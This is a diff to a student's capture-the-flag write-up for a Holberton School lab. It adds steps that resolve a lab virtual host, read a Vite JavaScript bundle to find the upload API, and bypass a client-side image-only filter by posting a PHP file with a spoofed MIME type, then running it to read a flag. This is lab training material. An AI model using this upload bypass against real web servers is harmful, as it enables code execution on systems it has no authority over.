@@ -339,7 +339,7 @@ ________________________________________________
 - `-mc all` – match all status codes (so we see 200/301/403/500, not just the defaults), then...
 - `-fc 404` – ...filter out genuine 404s to cut noise.
 
-We were checking whether the main domain exposes any **real paths** — an upload endpoint, a `robots.txt`, a sitemap, static assets, or an index that names other subdomains. Any of these could hand us the real subdomain directly instead of guessing -- but nope, no clues here either :-(
+We were checking whether the main domain exposes any **real paths** – an upload endpoint, a `robots.txt`, a sitemap, static assets, or an index that names other subdomains. Any of these could hand us the real subdomain directly instead of guessing -- but nope, no clues here either :-(
 
 
 
@@ -417,6 +417,241 @@ echo test-s3.web0x05.hbtn > 0-target.txt
 cat 0-target.txt
 
 git add .
-git commit -m "0-target.txt with domain"
+git commit -m "0-target.txt"
+git push
+```
+
+
+
+## 1. Some filters are only client-sided !
+
+Having identified the vulnerable subdomain, your next challenge is to bypass the client-side file type filtering mechanism of the web application's upload feature.
+Your success in uploading a restricted file type will reveal a hidden Flag ⛳️ as proof of your accomplishment.
+
+- Target Endpoint: http://[vuln-subdomain].web0x05.hbtn/task1
+
+You will need to use this php command to read the flag: <?php readfile('FLAG_1.txt') ?>
+FLAG will only be generated if you upload a php file!
+
+**Useful Instructions**
+
+1. Use browser developer tools to inspect the upload form and any JavaScript code that validates file types. Look for patterns or keywords it checks against.
+2. Consider using tools like Burp Suite to intercept and modify the upload request, changing the file name or MIME type to bypass client-side checks.
+3. Explore different ways to initiate the file upload (e.g., drag-and-drop functionality) that might not trigger client-side validation as expected.
+4. Pay attention to any error messages or feedback from the server after attempting an upload. These messages can offer clues for refining your bypass technique.
+
+
+### examine `/task1` page
+
+```bash
+curl -v http://test-s3.web0x05.hbtn/task1                 
+# * Could not resolve host: test-s3.web0x05.hbtn
+# * Store negative name resolve for test-s3.web0x05.hbtn:80
+# * shutting down connection #0
+# curl: (6) Could not resolve host: test-s3.web0x05.hbtn
+```
+
+`test-s3.web0x05.hbtn` doesn't resolve because it's a virtual host, not a real DNS name.  \
+Only `web0x05.hbtn` is in our `/etc/hosts`  \
+Earlier we never resolved the subdomain – we always sent it as a `Host:` header while connecting to the base name. So we have two clean options:
+
+1. **Option A** keep the `Host:` header and connect to the base host
+
+```bash
+curl -s -H "Host: test-s3.web0x05.hbtn" http://web0x05.hbtn/task1 | tee task1.html
+# <!-- 
+#       Done by 
+#       -       Yosri.me (YosriGFX)
+#       -       Ismail Mejdoub (Mejdoubee)
+#       For Holberton School
+# -->
+# <!doctype html>
+# <html lang="en">
+#   <head>
+#     <meta charset="UTF-8" />
+#         <link rel="icon" href="/static/favicon.ico">
+#     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+#     <title>File Manager - task1</title>
+#     <script type="module" crossorigin src="/static/index-DYK-Cu5G.js"></script>
+#   </head>
+#   <body>
+#     <div id="main" data-url="/api/task1/"></div>
+#   </body>
+# </html>
+``` 
+
+2. **Option B – add the vhost to `/etc/hosts` (most convenient)**. This makes the subdomain resolve to the same IP, so every normal command (`curl http://test-s3.web0x05.hbtn/...`, and even a browser) just works without header gymnastics.
+
+```bash
+# add vhost
+echo "10.42.220.203 test-s3.web0x05.hbtn" | sudo tee -a /etc/hosts
+# check /etc/hosts
+cat /etc/hosts
+
+# re-run the fetch
+curl -s http://test-s3.web0x05.hbtn/task1 | tee task1.html; echo; wc -c task1.html
+# <!-- 
+#         Done by 
+#         -       Yosri.me (YosriGFX)
+#         -       Ismail Mejdoub (Mejdoubee)
+#         For Holberton School
+# -->
+# <!doctype html>
+# <html lang="en">
+#   <head>
+#     <meta charset="UTF-8" />
+#         <link rel="icon" href="/static/favicon.ico">
+#     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+#     <title>File Manager - task1</title>
+#     <script type="module" crossorigin src="/static/index-DYK-Cu5G.js"></script>
+#   </head>
+#   <body>
+#     <div id="main" data-url="/api/task1/"></div>
+#   </body>
+# </html>
+# 494 task1.html
+```
+
+Better to go with option B because Burp/browser inspection is simpler.
+
+The vhost resolves now, and this page hands us the key detail: **it's a JavaScript single-page app**.  \
+The HTML is just a shell – the real logic lives in the JS bundle, and crucially, the mount point tells us the API base:
+
+```html
+<div id="main" data-url="/api/task1/"></div>
+```
+
+So the front-end (the `index-DYK-Cu5G.js` bundle) does its file-type validation in the browser, then POSTs to an API under `/api/task1/`. That `data-url` is the thread to pull: the client-side filter is exactly what we're meant to bypass, and the way to bypass a client-side check is to skip the client entirely and hit the API directly with curl. But first we need to know the exact request shape the API expects – the precise endpoint path, the file field name, and any other form fields.
+
+Let's read the JS bundle first – it will show us the field names and the exact upload URL without guesswork.
+
+```bash
+curl -s http://test-s3.web0x05.hbtn/static/index-DYK-Cu5G.js | tee bundle.js | wc -c
+# 451923
+```
+
+Let's check if minified.
+
+```bash
+head -c 500 bundle.js; echo; echo "--- line count ---"; wc -l bundle.js
+# function __vite__mapDeps(indexes) {
+#  if (!__vite__mapDeps.viteFileDeps) {
+#     __vite__mapDeps.viteFileDeps = ["static/routes/file-manager-B-dpKQ9v.js","static/routes/snackbar-provider-BKjL41nT.js","static/routes/ButtonBase-BYeNwEdz.js","static/routes/useEnhancedEffect-CRBrkxaE.js","static/routes/403-B2xe_i3I.js","static/routes/motion-container-DHsPk0bY.js","static/routes/bounce-i2n4nULb.js","static/routes/Button-CG_aPiPw.js","static/routes/404-DPw30Jnz.js","static/routes/index-B12osy1N.js","sta
+# --- line count ---
+# 71 bundle.js
+```
+
+~ 6kB / line => minified.
+
+- **71 lines for 441 KB** = ~6 KB per line on average. Human-written code is more like 30–80 chars per line. That density is the signature of minification: everything crammed onto few lines.
+- The first bytes show `__vite__mapDeps` – so this is a **Vite** production build, exactly the tool we suspected from the hashed filename.
+Notice the string array it's printing: `static/routes/file-manager-...js`, `403-...js`, `404-...js`, `Button-...js`. Vite does **code-splitting** – it lazy-loads route chunks. So the *upload logic for task1 probably isn't in this main bundle at all*; it's in one of these separate route chunks that loads on demand. The main bundle is mostly the router and framework glue.
+
+This changes our search slightly: rather than grep the main bundle for upload logic that may live elsewhere, let's first pull out the **full list of route chunks** so we can spot the one that handles uploads (likely something with "upload", "task", or "file-manager" in the name).
+
+```bash
+grep -oE '"static/routes/[^"]+\.js"' bundle.js | tr -d '"' | sort -u
+# static/routes/403-B2xe_i3I.js
+# static/routes/404-DPw30Jnz.js
+# static/routes/bounce-i2n4nULb.js
+# static/routes/ButtonBase-BYeNwEdz.js
+# static/routes/Button-CG_aPiPw.js
+# static/routes/classic-J3PRySif.js
+# static/routes/Container-Dmjin0dr.js
+# static/routes/file-manager-B-dpKQ9v.js
+# static/routes/header-simple-Cqv09_xg.js
+# static/routes/index-B12osy1N.js
+# static/routes/index-BPBoasAD.js
+# static/routes/modern-compact-BAiPVhy_.js
+# static/routes/motion-container-DHsPk0bY.js
+# static/routes/snackbar-provider-BKjL41nT.js
+# static/routes/Stack-aV8DaWSP.js
+# static/routes/Toolbar-DizB3ty0.js
+# static/routes/useEnhancedEffect-CRBrkxaE.js
+# static/routes/use-responsive-BjpGEwk-.js
+```
+
+The standout candidate is **`file-manager-B-dpKQ9v.js`** – that's the app's core feature ("File Manager" was the page title all along), and the upload form plus its client-side filter almost certainly live there. The others are framework/UI plumbing (`Button`, `Stack`, `Toolbar`, `Container`), page shells (`403`, `404`), or theme variants (`classic`, `modern-compact`).
+
+Let's pull that chunk and immediately search for the interesting strings.
+
+```bash
+curl -s http://test-s3.web0x05.hbtn/static/routes/file-manager-B-dpKQ9v.js -o file-manager.js
+grep -oiE '\.(php|jpg|jpeg|png|gif|pdf|txt|svg|zip|exe)\b' file-manager.js | sort | uniq -c
+echo "--- api / upload strings ---"
+grep -oiE '(/api/[a-z0-9/_-]*|upload|accept|multipart|formdata|allowed|mime|extension)' file-manager.js | sort | uniq -c
+# --- api / upload strings ---
+#       1 /api/list/
+#       1 FormData
+#       5 upload
+#       1 Upload
+```
+
+- download JS chunck locally as `file-manager.js`
+- First grep – `\.(php|jpg|...)\b` scans for **file-extension literals**. The client-side filter has to name the extensions it allows or blocks somewhere, and minification leaves string literals untouched. `uniq -c` counts each so we see which extensions the code mentions. If we see `jpg/png/gif` but the task wants us to upload `.php`, that's the exact filter we're bypassing.
+- Second grep – hunts for the A**PI and upload mechanics**: any `/api/...` path (our POST target, building on the `/api/task1/` we saw in `data-url`), plus telltale words like `upload`, `accept`, `multipart`, `formdata`, `allowed`, `mime`, `extension`. These reveal the endpoint, the request encoding, and the field names.
+
+**Result**:
+
+1. **No extension literals in this chunk**. That's actually a meaningful clue. It suggests the allowed-types filter might not be a hardcoded list like `['jpg','png']` in the code – it could instead be driven by an `accept` attribute on the file input, or a MIME check, or configuration fetched from the API. Or the upload logic lives partly in a *different* chunk. Either way, our simple grep was too narrow.
+2. **`/api/list/` and `FormData` confirm the shape**. The app uses `FormData` (multipart) and has at least a listing endpoint. The upload endpoint itself didn't print as a clean `/api/...` string – which often means it's **built dynamically** by concatenating the base URL (remember `data-url="/api/task1/"`) with a suffix, so it doesn't exist as one literal string for grep to find.
+
+Let's look at the actual **context around the `upload` occurrences** – that's where the endpoint, the field name, and any filtering will be visible together.
+
+```bash
+grep -oiE '.{80}upload.{90}' file-manager.js                                               
+# hen((e=>e.$))),__vite__mapDeps([0,1,2,3,4,5,6,7,8])))),l={list_dir:"/api/list/",upload:document.getElementById("main").getAttribute("data-url")};function o(){const{enqueueSnack
+# {children:t.jsx("title",{children:" Dashboard: File Manager"})}),t.jsx(n,{handleUpload:(e,t,a)=>{if(l.upload){const r=new FormData;r.append("file",e),fetch(l.upload,{method:"PO
+# e.json())).then((e=>{e.error?t(e.error):(s(e.message),d(),a())}))}else t("Can't upload. Currently we don't support uploads.")},allFiles:o,setAllFiles:i,allTypes:["image"]})]})}
+```
+
+- `.{80}upload.{80}` – matches the word `upload` **plus 80/90 characters on each side**.  \
+That surrounding context typically contains the endpoint path being built, the `FormData.append("fieldname", file)` call (revealing the *file field name*), and any adjacent validation.
+- **Endpoint**: `upload:document.getElementById("main").getAttribute("data-url")` – so the upload URL is the `data-url` we already saw: **`/api/task1/`**. The POST goes straight there.
+- **Field name**: `r.append("file",e)` — the file is sent under the field name **`file`**. curl must match this exactly.
+- **Request**: `r=new FormData` `+` `fetch(l.upload, {...})` → a standard multipart/form-data **POST**
+- **The filter**: the very end shows `allTypes:["image"]`, i.e. a client-side allowed-types list restricted to images. That's the check we bypass.  \
+Note: this validation exists only in the browser JS. The server-side handler at `/api/task1/` is what we're POSTing to directly — skipping the JS means skipping the filter entirely.
+
+We have everything needed. Let's build the PHP payload and upload it in one go.
+
+```bash
+# create php file
+printf "%s" "<?php readfile('FLAG_1.txt') ?>" > shell.php
+
+# check php file
+cat shell.php
+# <?php readfile('FLAG_1.txt') ?>
+
+# upload
+curl -s -i -X POST http://test-s3.web0x05.hbtn/api/task1/ -F "file=@shell.php;type=image/png"
+# HTTP/1.1 200 OK
+# Server: nginx/1.22.1
+# Date: Sun, 26 Jul 2026 21:22:58 GMT
+# Content-Type: application/json
+# Content-Length: 64
+# Connection: keep-alive
+# 
+# {"message":"'/static/upload/shell.php' uploaded successfully."}
+```
+
+- `shell.php` payload uploaded at **`/static/upload/shell.php`**
+
+
+### activate php payload
+
+```bash
+curl -s http://test-s3.web0x05.hbtn/static/upload/shell.php
+# 91bfa5e55b2c6d354bc91479e62207bf
+```
+
+### save flag
+
+```bash
+echo 91bfa5e55b2c6d354bc91479e62207bf > 1-flag.txt
+cat 1-flag.txt
+
+git add .
+git commit -m "1-flag.txt"
 git push
 ```
